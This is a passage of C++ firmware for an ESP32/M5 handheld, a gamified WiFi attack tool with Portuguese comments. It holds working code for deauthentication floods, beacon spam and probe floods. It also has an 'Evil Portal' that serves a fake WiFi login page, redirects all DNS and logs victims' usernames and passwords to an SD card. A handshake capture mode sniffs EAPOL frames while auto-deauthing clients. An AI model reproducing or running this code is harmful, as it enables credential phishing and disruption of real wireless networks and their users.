    DisplayHelper::drawText(channelInfo, 4, 44, themeColors.fg);

    char rssiInfo[30];
    snprintf(rssiInfo, sizeof(rssiInfo), "RSSI: %d dBm", networks[selectedNetwork].rssi);
    DisplayHelper::drawText(rssiInfo, 4, 54, themeColors.fg);

    char packetsInfo[30];
    snprintf(packetsInfo, sizeof(packetsInfo), "Packets sent: %lu", deauthCount);
    DisplayHelper::drawText(packetsInfo, 4, 70, themeColors.error);

    // Wave animation when attacking
    if (isDeauthing) {
        DisplayHelper::drawText("\nATTACK ACTIVE!", 4, 85, themeColors.success);

        // Radio waves animation
        static int waveFrame = 0;
        const char* waves[] = {
            ")    ", "))   ", ")))  ", ")))) ", ")))))",
            " ))))", "  )))", "   ))", "    )"
        };
        DisplayHelper::drawText(waves[waveFrame % 9], 170, 90, themeColors.error);
        waveFrame++;

        // Attack burst indicator
        if (millis() % 200 < 100) {
            DisplayHelper::drawStatusIndicator(200, 95, 3, themeColors.error);
        }
    } else {
        DisplayHelper::drawText("\nPAUSED", 4, 85, themeColors.secondary);
    }

    DisplayHelper::drawText("[SPACE]Pause [ESC]Stop", 4, SCREEN_HEIGHT - 24, themeColors.secondary);
    drawStatusBar();
}

void updateDeauth() {
    if (isDeauthing && millis() - lastDeauth > 100) {
        sendDeauthPacket(networks[selectedNetwork].bssid, 
                        networks[selectedNetwork].channel);
        deauthCount++;
        totalDeauthSent++;
        lastDeauth = millis();
        
        // Pet reaction to deauth
        if (nekoPet && totalDeauthSent % 10 == 0) {
            nekoPet->witnessHackSuccess("deauth attack");
        }
        
        // Achievement: deauth attacks
        if (achievementManager && totalDeauthSent % 100 == 0) {
            achievementManager->onEvent(EVENT_WIFI_DEAUTH, 100);
        }
        
        M5.Display.fillRect(100, 72, 120, 16, themeColors.bg);
        M5.Display.setTextColor(themeColors.error, themeColors.bg);
        M5.Display.setCursor(4, 72);
        M5.Display.printf("Packets sent: %lu", deauthCount);
    }
}

void stopDeauth() {
    isDeauthing = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== BEACON SPAM ====================
void sendBeaconPacket(const char* ssid, uint8_t channel) {
    uint8_t beacon_packet[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00,
        0x01, 0x04,
        0x00
    };
    
    int ssid_len = strlen(ssid);
    beacon_packet[37] = ssid_len;
    memcpy(&beacon_packet[38], ssid, ssid_len);
    
    int packet_size = 38 + ssid_len + 1;
    beacon_packet[packet_size++] = 0x01;
    beacon_packet[packet_size++] = 0x08;
    beacon_packet[packet_size++] = 0x82;
    beacon_packet[packet_size++] = 0x84;
    beacon_packet[packet_size++] = 0x8b;
    beacon_packet[packet_size++] = 0x96;
    beacon_packet[packet_size++] = 0x0c;
    beacon_packet[packet_size++] = 0x12;
    beacon_packet[packet_size++] = 0x18;
    beacon_packet[packet_size++] = 0x24;
    
    beacon_packet[packet_size++] = 0x03;
    beacon_packet[packet_size++] = 0x01;
    beacon_packet[packet_size++] = channel;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, packet_size, false);
}

void startBeaconSpam() {
    currentMode = MODE_BEACON_SPAM;
    isBeaconSpamming = true;
    beaconCount = 0;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    
    drawBeaconSpamScreen();
}

// REFATORADO: Usa DisplayHelper para renderização limpa
void drawBeaconSpamScreen() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Beacon Spam");

    char ssidInfo[50];
    snprintf(ssidInfo, sizeof(ssidInfo), "SSID: %s", customSSID.c_str());
    DisplayHelper::drawText(ssidInfo, 4, 24, themeColors.fg);
    DisplayHelper::drawText("Channel: 1-11 (hopping)", 4, 34, themeColors.fg);

    char beaconsInfo[40];
    snprintf(beaconsInfo, sizeof(beaconsInfo), "Beacons sent: %lu", beaconCount);
    DisplayHelper::drawText(beaconsInfo, 4, 50, themeColors.success);

    if (isBeaconSpamming) {
        DisplayHelper::drawText("FLOODING ACTIVE!", 4, 70, themeColors.error);

        // Beacon pulse animation (expanding circles)
        static int pulseRadius = 0;
        static unsigned long lastPulse = 0;
        if (millis() - lastPulse > 100) {
            pulseRadius = (pulseRadius + 5) % 30;
            lastPulse = millis();
        }

        int centerX = 200;
        int centerY = 95;
        M5.Display.drawCircle(centerX, centerY, pulseRadius, themeColors.primary);
        if (pulseRadius > 10) {
            M5.Display.drawCircle(centerX, centerY, pulseRadius - 10, themeColors.secondary);
        }
        if (pulseRadius > 20) {
            M5.Display.drawCircle(centerX, centerY, pulseRadius - 20, TFT_DARKGREY);
        }

        DisplayHelper::drawText("📡", 195, 90, themeColors.secondary);
    } else {
        DisplayHelper::drawText("PAUSED", 4, 70, themeColors.secondary);
    }

    DisplayHelper::drawText("[SPACE]Pause [ESC]Stop", 4, SCREEN_HEIGHT - 24, themeColors.secondary);
    drawStatusBar();
}

void updateBeaconSpam() {
    if (isBeaconSpamming && millis() - lastBeacon > 100) {
        static uint8_t channel = 1;
        
        char ssid[32];
        snprintf(ssid, sizeof(ssid), "%s_%d", customSSID.c_str(), random(1000));
        
        sendBeaconPacket(ssid, channel);
        beaconCount++;
        totalBeaconsSent++;
        lastBeacon = millis();
        
        channel = (channel % 11) + 1;
        
        M5.Display.fillRect(100, 56, 120, 16, TFT_BLACK);
        M5.Display.setTextColor(themeColors.success, themeColors.bg);
        M5.Display.setCursor(4, 56);
        M5.Display.printf("Beacons sent: %lu", beaconCount);
    }
}

void stopBeaconSpam() {
    isBeaconSpamming = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== PROBE FLOOD ====================
void sendProbeRequest(const char* ssid, uint8_t channel) {
    uint8_t probe_packet[128] = {
        0x40, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00,
        0x00
    };
    
    int ssid_len = strlen(ssid);
    probe_packet[25] = ssid_len;
    memcpy(&probe_packet[26], ssid, ssid_len);
    
    int packet_size = 26 + ssid_len + 1;
    probe_packet[packet_size++] = 0x01;
    probe_packet[packet_size++] = 0x08;
    probe_packet[packet_size++] = 0x82;
    probe_packet[packet_size++] = 0x84;
    probe_packet[packet_size++] = 0x8b;
    probe_packet[packet_size++] = 0x96;
    probe_packet[packet_size++] = 0x0c;
    probe_packet[packet_size++] = 0x12;
    probe_packet[packet_size++] = 0x18;
    probe_packet[packet_size++] = 0x24;
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, probe_packet, packet_size, false);
}

void startProbeFlood() {
    currentMode = MODE_PROBE_FLOOD;
    isProbeFlooding = true;
    probeCount = 0;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    
    drawProbeFloodScreen();
}

// REFATORADO: Usa DisplayHelper para código mais limpo
void drawProbeFloodScreen() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Probe Flood");

    DisplayHelper::drawText("Random Probe Requests", 4, 24, themeColors.fg);
    DisplayHelper::drawText("Channel: 1-11 (hopping)", 4, 34, themeColors.fg);

    char probesInfo[40];
    snprintf(probesInfo, sizeof(probesInfo), "Probes sent: %lu", probeCount);
    DisplayHelper::drawText(probesInfo, 4, 50, themeColors.primary);

    if (isProbeFlooding) {
        DisplayHelper::drawText("FLOODING ACTIVE!", 4, 70, themeColors.error);
        
        // Scatter particle effect (probe requests everywhere)
        static int particles[10][3]; // x, y, life
        static unsigned long lastParticle = 0;
        
        if (millis() - lastParticle > 100) {
            // Add new particle
            for (int i = 0; i < 10; i++) {
                if (particles[i][2] <= 0) {
                    particles[i][0] = random(10, 230);
                    particles[i][1] = random(50, 110);
                    particles[i][2] = random(5, 15);
                    break;
                }
            }
            lastParticle = millis();
        }
        
        // Draw particles
        for (int i = 0; i < 10; i++) {
            if (particles[i][2] > 0) {
                int brightness = map(particles[i][2], 0, 15, 0, 255);
                uint16_t color = M5.Display.color565(0, brightness, brightness);
                M5.Display.fillCircle(particles[i][0], particles[i][1], 2, color);
                particles[i][2]--;
            }
        }
        
        // Request wave animation
        static int wavePos = 0;
        wavePos = (wavePos + 2) % 240;
        M5.Display.drawFastVLine(wavePos, 90, 20, TFT_CYAN);
        if (wavePos > 5) M5.Display.drawFastVLine(wavePos - 5, 90, 20, TFT_BLUE);
        
    } else {
        DisplayHelper::drawText("PAUSED", 4, 70, themeColors.secondary);
    }

    DisplayHelper::drawText("[SPACE]Pause [ESC]Stop", 4, SCREEN_HEIGHT - 24, themeColors.secondary);
    drawStatusBar();
}

void updateProbeFlood() {
    if (isProbeFlooding && millis() - lastProbe > 50) {
        static uint8_t channel = 1;
        
        const char* ssids[] = {"WiFi", "Network", "Router", "Home", "Guest"};
        char ssid[32];
        snprintf(ssid, sizeof(ssid), "%s_%d", ssids[random(5)], random(1000));
        
        sendProbeRequest(ssid, channel);
        probeCount++;
        totalProbesSent++;
        lastProbe = millis();
        
        channel = (channel % 11) + 1;
        
        M5.Display.fillRect(100, 56, 120, 16, TFT_BLACK);
        M5.Display.setTextColor(themeColors.primary, themeColors.bg);
        M5.Display.setCursor(4, 56);
        M5.Display.printf("Probes sent: %lu", probeCount);
    }
}

void stopProbeFlood() {
    isProbeFlooding = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== EVIL PORTAL ====================
// Página HTML do captive portal
const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            font-size: 48px;
            margin-bottom: 10px;
        }
        h1 {
            text-align: center;
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            color: #999;
            font-size: 12px;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>WiFi Network</h1>
        <p>Please sign in to access the internet</p>
        <form action="/login" method="POST">
            <div class="input-group">
                <label for="username">Email or Username</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div class="footer">Secure connection • Protected by WPA2</div>
    </div>
</body>
</html>
)rawliteral";

// Página de sucesso após captura
const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            text-align: center;
            padding: 60px 40px;
            max-width: 400px;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Connecting to Network</h1>
        <p>Please wait while we verify your credentials...<br>This may take a few moments.</p>
    </div>
</body>
</html>
)rawliteral";

// Handler para página inicial
void handleRoot() {
    if (webServer) {
        if (useCustomPortal && customPortalHTML.length() > 0) {
            webServer->send(200, "text/html", customPortalHTML);
        } else {
            webServer->send(200, "text/html", PORTAL_HTML);
        }
    }
}

// Handler para captura de credenciais
void handleLogin() {
    if (webServer && webServer->hasArg("username") && webServer->hasArg("password")) {
        capturedUsername = webServer->arg("username");
        capturedPassword = webServer->arg("password");
        credentialsCaptured++;
        totalCredentialsCaptured++;
        
        Serial.println("\n🎣 CREDENTIALS CAPTURED!");
        Serial.println("Username: " + capturedUsername);
        Serial.println("Password: " + capturedPassword);
        Serial.println("================================");
        
        // Salvar no SD card
        if (sdCardAvailable) {
            File file = SD.open(CREDS_FILE, FILE_APPEND);
            if (file) {
                file.printf("[%lu] SSID: %s\n", millis(), customSSID.c_str());
                file.printf("Username: %s\n", capturedUsername.c_str());
                file.printf("Password: %s\n", capturedPassword.c_str());
                file.println("---");
                file.close();
                Serial.println("✅ Credentials saved to SD card!");
            }
        }
        
        webServer->send(200, "text/html", SUCCESS_HTML);
        
        // Atualizar tela
        drawEvilPortalScreen();
    }
}

// Handler para captura DNS (redirect tudo)
void handleNotFound() {
    if (webServer) {
        webServer->send(200, "text/html", PORTAL_HTML);
    }
}

void startEvilPortal() {
    currentMode = MODE_EVIL_PORTAL;
    portalRunning = true;
    clientsConnected = 0;
    credentialsCaptured = 0;
    capturedUsername = "";
    capturedPassword = "";
    portalStartTime = millis();
    
    // Configurar AP
    WiFi.mode(WIFI_AP);
    WiFi.softAP(customSSID.c_str());
    
    // Iniciar DNS Server (captura todas as requisições)
    if (!dnsServer) {
        dnsServer = new DNSServer();
    }
    dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    
    // Iniciar Web Server
    if (!webServer) {
        webServer = new WebServer(HTTP_PORT);
    }
    
    webServer->on("/", handleRoot);
    webServer->on("/login", HTTP_POST, handleLogin);
    webServer->onNotFound(handleNotFound);
    webServer->begin();
    
    Serial.println("🕳️ Evil Portal Started!");
    Serial.printf("SSID: %s\n", customSSID.c_str());
    Serial.printf("IP: %s\n", WiFi.softAPIP().toString().c_str());
    
    drawEvilPortalScreen();
}

// REFATORADO: Usa DisplayHelper para texto, mantém animações nativas
void drawEvilPortalScreen() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Evil Portal");

    char ssidInfo[50];
    snprintf(ssidInfo, sizeof(ssidInfo), "SSID: %s", customSSID.c_str());
    DisplayHelper::drawText(ssidInfo, 4, 24, themeColors.fg);

    char ipInfo[50];
    snprintf(ipInfo, sizeof(ipInfo), "IP: %s", WiFi.softAPIP().toString().c_str());
    DisplayHelper::drawText(ipInfo, 4, 34, themeColors.fg);
    
    // ===== ANIMATION: Connection Circles, Credential Sparkle, AP Blinking =====
    static unsigned long lastBlink = 0;
    static bool apIconVisible = true;
    static int connectionRings[3] = {0}; // Expanding connection circles
    static bool credentialSparkle = false;
    static unsigned long sparkleTime = 0;
    static int sparkleCount = 0;
    
    // AP icon blinking when active
    int apX = 215, apY = 30;
    if (portalRunning) {
        if (millis() - lastBlink > 500) {
            apIconVisible = !apIconVisible;
            lastBlink = millis();
        }
        
        if (apIconVisible) {
            M5.Display.fillCircle(apX, apY, 6, TFT_RED);
            M5.Display.drawCircle(apX, apY, 8, TFT_ORANGE);
            M5.Display.drawCircle(apX, apY, 10, TFT_YELLOW);
        } else {
            M5.Display.fillCircle(apX, apY, 6, TFT_DARKGREY);
        }
        
        // Connection animation rings
        for (int i = 0; i < 3; i++) {
            connectionRings[i] = (connectionRings[i] + 1) % 40;
            int radius = 12 + connectionRings[i] + (i * 15);
            if (radius < 50) {
                int brightness = 255 - (connectionRings[i] * 6);
                uint16_t color = M5.Display.color565(brightness, brightness / 2, 0);
                M5.Display.drawCircle(apX, apY, radius, color);
            }
        }
    }
    
    char clientsInfo[30];
    snprintf(clientsInfo, sizeof(clientsInfo), "Clients: %d", WiFi.softAPgetStationNum());
    DisplayHelper::drawText(clientsInfo, 4, 50, themeColors.primary);

    char capturedInfo[30];
    snprintf(capturedInfo, sizeof(capturedInfo), "Captured: %d", credentialsCaptured);
    DisplayHelper::drawText(capturedInfo, 4, 60, themeColors.secondary);
    
    // Credential capture sparkle effect
    static int lastCaptureCount = 0;
    if (credentialsCaptured > lastCaptureCount) {
        credentialSparkle = true;
        sparkleTime = millis();
        sparkleCount = 12;
        lastCaptureCount = credentialsCaptured;
    }
    
    if (credentialSparkle && (millis() - sparkleTime < 1000)) {
        // Draw sparkles around "Captured" text
        for (int i = 0; i < sparkleCount; i++) {
            float angle = (millis() / 100.0) + (i * 30);
            int sx = 100 + cos(angle * 0.0174533) * (15 + (millis() - sparkleTime) / 20);
            int sy = 60 + sin(angle * 0.0174533) * (10 + (millis() - sparkleTime) / 30);
            M5.Display.fillCircle(sx, sy, 2, TFT_YELLOW);
        }
        sparkleCount--;
        if (sparkleCount <= 0) credentialSparkle = false;
    }
    
    if (credentialsCaptured > 0) {
        DisplayHelper::drawText("Last capture:", 4, 80, themeColors.success);

        // Truncar se muito longo
        String user = capturedUsername;
        String pass = capturedPassword;
        if (user.length() > 22) user = user.substring(0, 19) + "...";
        if (pass.length() > 22) pass = pass.substring(0, 19) + "...";

        char userInfo[30];
        snprintf(userInfo, sizeof(userInfo), "U: %s", user.c_str());
        DisplayHelper::drawText(userInfo, 4, 90, themeColors.fg);

        char passInfo[30];
        snprintf(passInfo, sizeof(passInfo), "P: %s", pass.c_str());
        DisplayHelper::drawText(passInfo, 4, 100, themeColors.fg);
    }

    if (portalRunning) {
        DisplayHelper::drawText("PORTAL ACTIVE!", 4, SCREEN_HEIGHT - 32, themeColors.error);
    }

    DisplayHelper::drawText("[ESC]Stop", 4, SCREEN_HEIGHT - 16, themeColors.secondary);
    
    drawStatusBar();
}

void updateEvilPortal() {
    if (portalRunning && dnsServer && webServer) {
        dnsServer->processNextRequest();
        webServer->handleClient();
        
        // Atualizar contagem de clientes a cada 2s
        static unsigned long lastUpdate = 0;
        if (millis() - lastUpdate > 2000) {
            int currentClients = WiFi.softAPgetStationNum();
            if (currentClients != clientsConnected) {
                clientsConnected = currentClients;
                drawEvilPortalScreen();
            }
            lastUpdate = millis();
        }
    }
}

void stopEvilPortal() {
    portalRunning = false;
    
    if (webServer) {
        webServer->stop();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    Serial.println("🛑 Evil Portal Stopped");
    
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== HANDSHAKE CAPTURE ====================
// Callback para captura de pacotes WiFi
void packetSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    
    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *payload = packet->payload;
    const uint16_t len = packet->rx_ctrl.sig_len;
    
    if (len < 32) return;
    
    // Frame Control
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
    
    // Verificar se é Data frame (tipo 2)
    if (frameType == 2) {
        // Verificar EAPOL (802.1X)
        // EAPOL está após o header 802.11 (24-30 bytes) + LLC/SNAP (8 bytes)
        if (len > 40) {
            // LLC/SNAP header: AA AA 03 00 00 00 88 8E (EAPOL)
            int headerSize = 24;
            if (payload[1] & 0x40) headerSize = 30; // QoS frame
            
            if (headerSize + 8 < len) {
                uint16_t etherType = (payload[headerSize + 6] << 8) | payload[headerSize + 7];
                
                if (etherType == EAPOL_FRAME) {
                    // EAPOL Key frame!
                    eapolPackets++;
                    
                    // Verificar qual mensagem do 4-way handshake
                    // Key Info está no byte 5-6 do EAPOL Key
                    if (headerSize + 10 < len) {
                        uint16_t keyInfo = (payload[headerSize + 13] << 8) | payload[headerSize + 14];
                        bool pairwise = keyInfo & 0x0008;
                        bool install = keyInfo & 0x0040;
                        bool ack = keyInfo & 0x0080;
                        bool mic = keyInfo & 0x0100;
                        
                        // Identificar mensagem
                        if (pairwise && ack && !mic && !install) {
                            handshake.hasMsg1 = true;
                            Serial.println("📦 EAPOL Message 1/4 captured!");
                        }
                        else if (pairwise && !ack && mic && !install) {
                            handshake.hasMsg2 = true;
                            Serial.println("📦 EAPOL Message 2/4 captured!");
                        }
                        else if (pairwise && ack && mic && install) {
                            handshake.hasMsg3 = true;
                            Serial.println("📦 EAPOL Message 3/4 captured!");
                        }
                        else if (pairwise && !ack && mic && !install) {
                            handshake.hasMsg4 = true;
                            Serial.println("📦 EAPOL Message 4/4 captured!");
                        }
                        
                        // Verificar handshake completo
                        if (handshake.hasMsg1 && handshake.hasMsg2 && 
                            handshake.hasMsg3 && handshake.hasMsg4) {
                            handshakeComplete = true;
                            handshake.captureTime = millis();
                            totalHandshakesCaptured++;
                            
                            // Pet reaction to handshake capture
                            if (nekoPet) {
                                nekoPet->witnessHackSuccess("handshake capture");
                            }
                            
                            // Achievement: handshake captured
                            if (achievementManager) {
                                achievementManager->onEvent(EVENT_WIFI_HANDSHAKE, 1);
                            }
                            
                            Serial.println("🎉 HANDSHAKE COMPLETO CAPTURADO!");
                        }
                        
                        drawHandshakeScreen();
                    }
                }
            }
        }
    }
}

void startHandshakeCapture() {
    if (networkCount == 0) {
        M5.Display.clear(themeColors.bg);
        drawHeader("Handshake Capture");
        M5.Display.setTextColor(themeColors.error, themeColors.bg);
        M5.Display.setCursor(4, 24);
        M5.Display.println("No networks found!");
        M5.Display.println("\nScan first (option 1)");
        delay(2000);
        currentMode = MODE_MENU;
        drawMenu();
        return;
    }
    
    currentMode = MODE_HANDSHAKE;
    isCapturingHandshake = true;
    eapolPackets = 0;
    handshakeComplete = false;
    captureStartTime = millis();
    
    // Reset handshake info
    memcpy(handshake.bssid, networks[selectedNetwork].bssid, 6);
    handshake.hasMsg1 = false;
    handshake.hasMsg2 = false;
    handshake.hasMsg3 = false;
    handshake.hasMsg4 = false;
    handshake.captureTime = 0;
    
    // Configurar promiscuous mode
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(packetSniffer);
    esp_wifi_set_channel(networks[selectedNetwork].channel, WIFI_SECOND_CHAN_NONE);
    
    Serial.println("\n🤝 Handshake Capture Started!");
    Serial.printf("Target: %s\n", networks[selectedNetwork].ssid.c_str());
    Serial.printf("Channel: %d\n", networks[selectedNetwork].channel);
    Serial.println("Sending deauth packets to force reconnection...\n");
    
    drawHandshakeScreen();
}

// REFATORADO: Usa DisplayHelper para texto, mantém animações
void drawHandshakeScreen() {
    DisplayHelper::clear(themeColors.bg);
    drawHeader("Handshake Capture");

    char targetInfo[50];
    snprintf(targetInfo, sizeof(targetInfo), "Target: %.18s", networks[selectedNetwork].ssid.c_str());
    DisplayHelper::drawText(targetInfo, 4, 24, themeColors.fg);

    char channelInfo[30];
    snprintf(channelInfo, sizeof(channelInfo), "Channel: %d", networks[selectedNetwork].channel);
    DisplayHelper::drawText(channelInfo, 4, 34, themeColors.fg);

    // Status das mensagens
    DisplayHelper::drawText("4-Way Handshake:", 4, 50, themeColors.primary);
    
    // Progress bars para cada mensagem
    int barY = 64;
    for (int i = 0; i < 4; i++) {
        bool captured = false;
        const char* label = "";
        
        switch(i) {
            case 0: captured = handshake.hasMsg1; label = "Msg 1"; break;
            case 1: captured = handshake.hasMsg2; label = "Msg 2"; break;
            case 2: captured = handshake.hasMsg3; label = "Msg 3"; break;
            case 3: captured = handshake.hasMsg4; label = "Msg 4"; break;
        }
        
        M5.Display.setTextColor(themeColors.fg, themeColors.bg);
        M5.Display.setCursor(4, barY);
        M5.Display.print(label);
        
        // Progress bar
        int barWidth = 140;
        int barX = 50;
        M5.Display.drawRect(barX, barY, barWidth, 8, TFT_WHITE);
        
        if (captured) {
            M5.Display.fillRect(barX + 1, barY + 1, barWidth - 2, 6, TFT_GREEN);
            // Sparkle effect
            if (millis() % 500 < 250) {
                M5.Display.fillCircle(barX + barWidth + 8, barY + 4, 2, TFT_YELLOW);
            }
        } else if (isCapturingHandshake) {
            // Animated loading bar
            int progress = (millis() / 50) % barWidth;
            M5.Display.fillRect(barX + 1, barY + 1, progress, 6, TFT_BLUE);
        }
        
        // Flying packet animation when captured
        if (captured && millis() % 1000 < 500) {
            int packetX = barX + ((millis() / 20) % barWidth);
            M5.Display.setTextColor(themeColors.primary, themeColors.bg);
            M5.Display.setCursor(packetX, barY - 2);
            M5.Display.print(">>");
        }
        
        barY += 12;
    }
    
    char eapolInfo[30];
    snprintf(eapolInfo, sizeof(eapolInfo), "EAPOL packets: %d", eapolPackets);
    DisplayHelper::drawText(eapolInfo, 4, barY + 4, themeColors.secondary);

    if (handshakeComplete) {
        DisplayHelper::drawText("COMPLETE! ✨", 4, barY + 18, themeColors.success);

        // Success sparkles
        for (int i = 0; i < 5; i++) {
            if (millis() % (200 + i * 50) < 100) {
                M5.Display.fillCircle(random(10, 230), random(50, 110), 1, TFT_YELLOW);
            }
        }
    } else if (isCapturingHandshake) {
        DisplayHelper::drawText("LISTENING...", 4, barY + 18, themeColors.error);
    }

    DisplayHelper::drawText("[D]Deauth [ESC]Stop", 4, SCREEN_HEIGHT - 24, themeColors.secondary);
    
    drawStatusBar();
}

void updateHandshakeCapture() {
    // Enviar deauth periodicamente para forçar reconexão
    static unsigned long lastAutoDeauth = 0;
    if (isCapturingHandshake && !handshakeComplete && 
        millis() - lastAutoDeauth > 5000) {
        
        sendDeauthPacket(networks[selectedNetwork].bssid, 
                        networks[selectedNetwork].channel);
        lastAutoDeauth = millis();
        
        Serial.println("💥 Auto-deauth sent to trigger handshake");
    }
}

void stopHandshakeCapture() {
    isCapturingHandshake = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    
    Serial.println("🛑 Handshake Capture Stopped");
    if (handshakeComplete) {
        Serial.println("✅ Handshake was captured successfully!");
        
        // Salvar handshake no SD card
        if (sdCardAvailable) {
            if (!SD.exists(HANDSHAKE_DIR)) {
                SD.mkdir(HANDSHAKE_DIR);
            }
            
            String filename = String(HANDSHAKE_DIR) + "/" + 
                            networks[selectedNetwork].ssid + "_" + 
                            String(millis()) + ".cap";
            
            File file = SD.open(filename, FILE_WRITE);
            if (file) {
                file.printf("Handshake captured for: %s\n", networks[selectedNetwork].ssid.c_str());
                file.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          networks[selectedNetwork].bssid[0],
                          networks[selectedNetwork].bssid[1],
                          networks[selectedNetwork].bssid[2],
                          networks[selectedNetwork].bssid[3],
                          networks[selectedNetwork].bssid[4],
                          networks[selectedNetwork].bssid[5]);
                file.printf("Channel: %d\n", networks[selectedNetwork].channel);
                file.printf("Time: %lu ms\n", handshake.captureTime);
                file.printf("EAPOL Packets: %d\n", eapolPackets);
                file.close();
                Serial.println("💾 Handshake saved to: " + filename);
            }
        }
    }
    
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== FILE MANAGER ====================
void initSDCard() {
    Serial.println("    → Configuring SPI...");
    SPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
    
    Serial.println("    → Attempting SD.begin() with 3s timeout...");
    unsigned long timeout = millis() + 3000;  // 3 second timeout
    bool sdSuccess = false;
    
    // Try SD.begin() with timeout protection
    sdSuccess = SD.begin(SD_CS, SPI, 25000000);
    
    if (sdSuccess && millis() < timeout) {
        sdCardAvailable = true;
        Serial.println("    ✅ SD Card initialized!");
        
        // Criar diretórios necessários
        Serial.println("    → Creating directories...");
        if (!SD.exists(HANDSHAKE_DIR)) {
            SD.mkdir(HANDSHAKE_DIR);
            Serial.println("       📁 Created " + String(HANDSHAKE_DIR));
        }
        if (!SD.exists(PORTAL_DIR)) {
            SD.mkdir(PORTAL_DIR);
            Serial.println("       📁 Created " + String(PORTAL_DIR));
        }
        
        // Criar arquivo de credenciais se não existir
        Serial.println("    → Checking credentials file...");
        if (!SD.exists(CREDS_FILE)) {
